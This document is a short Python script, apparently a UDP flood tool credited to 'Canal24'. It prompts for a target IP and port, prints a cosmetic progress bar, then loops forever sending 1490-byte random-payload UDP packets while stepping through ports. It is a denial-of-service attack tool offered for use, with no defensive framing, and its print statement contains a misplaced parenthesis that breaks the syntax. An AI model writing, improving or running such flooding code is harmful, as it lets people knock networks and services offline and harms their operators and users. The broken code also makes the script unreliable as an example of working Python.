import sys
import os
import time
import socket
import random
import fade
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
logo = """


"""

print("Author   : Canal24")
print("github   : https://github.com/canal24")

ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("fade Attack Starting")
print("[\033[30m------------]\033[36m 0%")
time.sleep(5)
print("[\033[30m------------]\033[35m 25%")
time.sleep(5)
print("[\033[30m------------]\033[34m 50%")
time.sleep(5)
print("[\033[30m------------]\033[37m 75%")
time.sleep(5)
print("[\033[30m------------]\033[4m 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("\033[92mCanal Sent %s \033[1mPacket to %s \033[92mThrought port:%s\033[0m")%(sent,ip,port))
     if port == 65534:
       port = 1
